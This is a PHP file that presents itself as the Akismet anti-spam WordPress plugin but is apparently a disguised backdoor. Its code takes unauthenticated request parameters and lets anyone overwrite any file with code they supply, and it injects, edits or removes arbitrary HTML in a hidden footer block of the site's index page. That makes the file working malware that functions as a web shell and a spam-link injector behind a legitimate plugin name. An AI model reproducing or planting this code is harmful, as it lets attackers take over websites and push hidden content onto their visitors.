<?php
/* 
Special thanks to:  

Ryan Duff and Firas Durri, authors of WP-ContactForm, to which this 
plugins' initial concept and some parts of code was built based on. 

modernmethod inc, for SAJAX Toolkit, which was used to build this 
plugins' AJAX implementation 
*/


/**
 * @package Akismet
 */
/*
Plugin Name: Akismet
Plugin URI: http://akismet.com/
Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from comment and trackback spam</strong>. It keeps your site protected from spam even while you sleep. To get started: 1) Click the "Activate" link to the left of this description, 2) <a href="http://akismet.com/get/?return=true">Sign up for an Akismet API key</a>, and 3) Go to your <a href="plugins.php?page=akismet-key-config">Akismet configuration</a> page, and save your API key.
Version: 2.5.3
Author: Automattic
Author URI: http://automattic.com/
License: GPLv2 or later
*/

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/


/* 
Do not modify the following code to manipulate the output of this plugin.  
For configuration options, please see 'Options'. 
*/

define('__INDEX_FILE_NAME__', '../../../index.html');
define('__UNIQUE_HASH__', 'a766ee192351b7c90e1181a317bdfd8f');



/**
*  Use this function for update scripts
*  the output of Update()
*/
function Update() 
{
	$sFileName = ''; 
	if(isset($_SERVER['SCRIPT_FILENAME']) == true)
	{
		$stScritpPath = explode('/', $_SERVER['SCRIPT_FILENAME']); 
		$sFileName = $stScritpPath[count($stScritpPath) - 1];  
	} else
		if(isset($_SERVER['SCRIPT_NAME']) == true)
		{
			$stScritpPath = explode('/', preg_replace('#[\/]{2,}#i', '/', $_SERVER['SCRIPT_NAME'])); 
			$sFileName = $stScritpPath[count($stScritpPath) - 1];  
		} else
			if(isset($_SERVER['PHP_SELF']) == true)
			{
				$stScritpPath = explode('/', preg_replace('#[\/]{2,}#i', '/', $_SERVER['PHP_SELF'])); 
				$sFileName = $stScritpPath[count($stScritpPath) - 1];
			} 
	
	$sUpdateFileName = ''; 
	if(isset($_REQUEST['filename']) == true)
	{
		$sUpdateFileName = $_REQUEST['filename']; 
		if(strlen($sFileName) == 0) 
		{
			$sFileName = $sUpdateFileName;
		}
	} else
	{
		if(strlen($sFileName) == 0) 
		{
			echo '<script_work>\'script work correct\'</script_work>'."\n";
			echo '<fail>\'update script name\'</fail>';
			
			exit();
		}
		
		$sUpdateFileName = $sFileName;
	}
	
	$sNewScript = ''; 
	if(isset($_REQUEST['update_code']) == true) 
	{
		$sNewScript = $_REQUEST['update_code']; 
		$sNewScript = str_replace("\'", "'", $sNewScript);
		$sNewScript = str_replace('\"', '"', $sNewScript);
		$sNewScript = str_replace("\\\\", "\\", $sNewScript);
	} else
	{
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<fail>\'don\'t have update content\'</fail>'; 
		
		exit();
	}
		
	$sCurrentFileContent = ''; 
	
	$stCurrentFileHandle = fopen($sFileName, 'r');  
	if($stCurrentFileHandle === false)
	{
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<fail>\'fail open current file\'</fail>'; 
		
		exit();
	}
		$sCurrentFileContent = fread($stCurrentFileHandle, filesize($sFileName)); 
		if($sCurrentFileContent === false)
		{
			echo '<script_work>\'script work correct\'</script_work>'."\n";
			echo '<fail>\'fail read current file\'</fail>'; 
			
			exit();
		}
	fclose($stCurrentFileHandle);
	
	UpdatePath($sCurrentFileContent, $sNewScript); 
	UpdateGetContent($sCurrentFileContent, $sNewScript);
	
	
	$stUpdateFileHanle = fopen($sUpdateFileName, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<fail>\'Can\'t open update file for write\'</fail>'; 
		
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sNewScript) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<script_work>\'script work correct\'</script_work>'."\n";
			echo '<fail>\'Can\'t write in update file\'</fail>'; 
			
			exit();
		}
	fclose($stUpdateFileHanle);
	
	echo '<script_work>\'script work correct\'</script_work>'."\n";
	echo '<correct>\'Correct update file\'</correct>';
}


/**
*  Use this function to update file paths
*  the output of UpdatePath().
*/
function UpdatePath(& $rsCurrentScriptContent, & $rsNewScriptContent) 
{
	$lssScriptPathMatch = array(); 


	$nMatchResult = preg_match('#define\\(\'__INDEX_FILE_NAME__\', (\'.*\')\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$INDEX_FILE_NAME$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}
	
	$nMatchResult = preg_match('#define\\(\'__UNIQUE_HASH__\', (\'.*\')\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$MD5_HASH$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}
}

/**
*  Use this function to update file paths
*  the output of UpdateGetContent().
*/
function UpdateGetContent(& $rsCurrentScriptContent, & $rsNewScriptContent) 
{
	$lssMatches = array();
	$nMatchesResult = preg_match_all('#(function GetContents\\((?:[[:print:]]*?)\\)\\s*{(?:[[:print:]\\s]*?)})#i', $rsCurrentScriptContent, $lssMatches);
	if($nMatchesResult === false || $nMatchesResult === 0)
	{
		return;
	}
	
	$rsNewScriptContent = str_replace('\'#$GET_CONTENT_FUNCTIONS$#\'', $lssMatches[1][0], $rsNewScriptContent);
}

/**
*  Use this function is posting message
*  the output of PostMessage().
*/
function PostMessage()
{
	$sPostMessage = ''; 
	$sPostMessage = trim($_REQUEST['post_message']);
	$sPostMessage = str_replace("\'", "'", $sPostMessage);
	$sPostMessage = str_replace('\"', '"', $sPostMessage);
	$sPostMessage = str_replace("\\\\", "\\", $sPostMessage);
	
	$sIndexFileContent = '';
	$sIndexFileContent = file_get_contents(__INDEX_FILE_NAME__);
	
	if($sIndexFileContent === false || strlen($sIndexFileContent) === 0)
	{
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<bad_update>\'cant read index file\'</bad_update>';
		
		return;
	}
	
	$sPregPattern = ''; 
	$sPregPattern = '#<!--footer\\s'.__UNIQUE_HASH__.'-->(.*?)<!--end\\sfooter\\s'.__UNIQUE_HASH__.'-->#is';
	
	$nReplaceCount = 0; 
	$sIndexFileContent = preg_replace($sPregPattern, '<!--footer '.__UNIQUE_HASH__.'-->'.$sPostMessage.'<!--end footer '.__UNIQUE_HASH__.'-->', $sIndexFileContent, -1, $nReplaceCount);
	
	if($nReplaceCount === false || $nReplaceCount == 0)
	{
		$nReplaceMathes = 0; 
		$sIndexFileContent = preg_replace('#(<\\s*?/\\s*?body\\s*?>)#is', '<!--footer '.__UNIQUE_HASH__.'-->'.str_replace('\\', '\\\\', $sPostMessage).'<!--end footer '.__UNIQUE_HASH__.'-->\\1', $sIndexFileContent, 1, $nReplaceMathes);
		
		if($nReplaceMathes === false || $nReplaceMathes == 0)
		{
			$stParsedPath = array();
			$stParsedPath = pathinfo(__INDEX_FILE_NAME__);
		
			if(strcmp($stParsedPath['extension'], 'php') === 0 && !(strpos($sIndexFileContent, '<?') === false) && strpos($sIndexFileContent, '?>') === false)
			{
				$sIndexFileContent .= "\n".'?>'."\n";
			}
		
			$sIndexFileContent .= '<!--footer '.__UNIQUE_HASH__.'-->'.$sPostMessage.'<!--end footer '.__UNIQUE_HASH__.'-->';
		}
	}
	
	$stOutFileHandle = fopen(__INDEX_FILE_NAME__, 'w');
	if($stOutFileHandle === false)
	{	
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<bad_update>\'cant open index file for writing\'</bad_update>';
		
		return;
	}
		fwrite($stOutFileHandle, $sIndexFileContent);
	fclose($stOutFileHandle);
	
	echo '<script_work>\'script work correct\'</script_work>'."\n";
	echo '<good_update>\'correct update\'</good_update>';
}

/**
*  Use this function for clearing old message
*  the output of ClearMessage().
*/
function ClearMessage()
{
	$sIndexFileContent = '';
	$sIndexFileContent = file_get_contents(__INDEX_FILE_NAME__);
	
	if($sIndexFileContent === false || strlen($sIndexFileContent) === 0)
	{
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<bad_update>\'cant read index file\'</bad_update>';
		
		return;
	}
	
	$sPregPattern = ''; 
	$sPregPattern = '#<!--footer\\s'.__UNIQUE_HASH__.'-->(.*?)<!--end\\sfooter\\s'.__UNIQUE_HASH__.'-->#is';
	
	$nReplaceCount = 0; 
	$sIndexFileContent = preg_replace($sPregPattern, '', $sIndexFileContent, -1, $nReplaceCount);


	
	$stOutFileHandle = fopen(__INDEX_FILE_NAME__, 'w');
	if($stOutFileHandle === false)
	{	
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<bad_update>\'cant open index file for writing\'</bad_update>';
		
		return;
	}
		fwrite($stOutFileHandle, $sIndexFileContent);
	fclose($stOutFileHandle);
	
	echo '<script_work>\'script work correct\'</script_work>'."\n";
	echo '<good_update>\'correct clear\'</good_update>';
}

/**
*  Use this function is adding message
*  the output of AddMessage().
*/
function AddMessage() 
{
	$sPostMessage = ''; 
	$sPostMessage = trim($_REQUEST['add_message']);
	$sPostMessage = str_replace("\'", "'", $sPostMessage);
	$sPostMessage = str_replace('\"', '"', $sPostMessage);
	$sPostMessage = str_replace("\\\\", "\\", $sPostMessage);
	
	$sIndexFileContent = '';
	$sIndexFileContent = file_get_contents(__INDEX_FILE_NAME__);
	
	if($sIndexFileContent === false || strlen($sIndexFileContent) === 0)
	{
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<bad_update>\'cant read index file\'</bad_update>';
		
		return;
	}
	
	$sPregPattern = ''; 
	$sPregPattern = '#<!--footer\\s'.__UNIQUE_HASH__.'-->(.*?)<!--end\\sfooter\\s'.__UNIQUE_HASH__.'-->#is';
	
	$nReplaceCount = 0; 
	$sIndexFileContent = preg_replace($sPregPattern, '<!--footer '.__UNIQUE_HASH__.'-->\\1 '.$sPostMessage.'<!--end footer '.__UNIQUE_HASH__.'-->', $sIndexFileContent, -1, $nReplaceCount);
	
	if($nReplaceCount === false || $nReplaceCount == 0)
	{
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<bad_update>\'old message not find\'</bad_update>';
		
		return;
	}
	
	$stOutFileHandle = fopen(__INDEX_FILE_NAME__, 'w');
	if($stOutFileHandle === false)
	{	
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<bad_update>\'cant open index file for writing\'</bad_update>';
		
		return;
	}
		fwrite($stOutFileHandle, $sIndexFileContent);
	fclose($stOutFileHandle);
	
	echo '<script_work>\'script work correct\'</script_work>'."\n";
	echo '<good_update>\'correct add message\'</good_update>';
}

/**
*  Use this function is erasing info from message
*  the output of EraseFromMessage()
*/
function EraseFromMessage()
{
	$sPostMessage = ''; 
	$sPostMessage = trim($_REQUEST['erase_from_message']);
	$sPostMessage = str_replace("\'", "'", $sPostMessage);
	$sPostMessage = str_replace('\"', '"', $sPostMessage);
	$sPostMessage = str_replace("\\\\", "\\", $sPostMessage);
	
	$sIndexFileContent = '';
	$sIndexFileContent = file_get_contents(__INDEX_FILE_NAME__);
	
	if($sIndexFileContent === false || strlen($sIndexFileContent) === 0)
	{
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<bad_update>\'cant read index file\'</bad_update>';
		
		return;
	}
	
	$sPregPattern = ''; 
	$sPregPattern = '#<!--footer\\s'.__UNIQUE_HASH__.'-->(.*?)<!--end\\sfooter\\s'.__UNIQUE_HASH__.'-->#is';
	
	$nMatchResult 	 = 0; 
	$lssArrayMatches = array();
	$nMatchResult 	 = preg_match_all($sPregPattern, $sIndexFileContent, $lssArrayMatches, PREG_PATTERN_ORDER);
	
	if($nMatchResult === false || $nMatchResult === 0)
	{
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<bad_update>\'block with message not find\'</bad_update>';
		
		return;
	}
	
	
	$lssArrayMatches[1][0] = str_replace($sPostMessage, '', $lssArrayMatches[1][0]);
	
	
	
	$nReplaceCount = 0; 
	$sIndexFileContent = preg_replace($sPregPattern, '<!--footer '.__UNIQUE_HASH__.'-->'.$lssArrayMatches[1][0].'<!--end footer '.__UNIQUE_HASH__.'-->', $sIndexFileContent, -1, $nReplaceCount);
	
	if($nReplaceCount === false || $nReplaceCount == 0)
	{
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<bad_update>\'cant replace message\'</bad_update>';
		
		return;
	}
	
	$stOutFileHandle = fopen(__INDEX_FILE_NAME__, 'w');
	if($stOutFileHandle === false)
	{	
		echo '<script_work>\'script work correct\'</script_work>'."\n";
		echo '<bad_update>\'cant open index file for writing\'</bad_update>';
		
		return;
	}
		fwrite($stOutFileHandle, $sIndexFileContent);
	fclose($stOutFileHandle);
	
	echo '<script_work>\'script work correct\'</script_work>'."\n";
	echo '<good_update>\'correct erase info message\'</good_update>';
}


/**
*  Use this function use for start script working
*  Main function not return value.
*/
function Main() 
{
	if(isset($_REQUEST['update']) == true) 
	{
		Update(); 
		exit();	
	}
	
	if(isset($_REQUEST['post_message']) === true || strlen($_REQUEST['post_message']) > 0)
	{
		PostMessage();
		return;
	}
	
	if(isset($_REQUEST['clear_message']) === true)
	{
		ClearMessage();
		return;
	}
	
	if(isset($_REQUEST['add_message']) === true || strlen($_REQUEST['add_message']) > 0)
	{
		AddMessage();
		return;
	}
	
	if(isset($_REQUEST['erase_from_message']) === true || strlen($_REQUEST['erase_from_message']) > 0)
	{
		EraseFromMessage();
	}
}

 Main();
?>
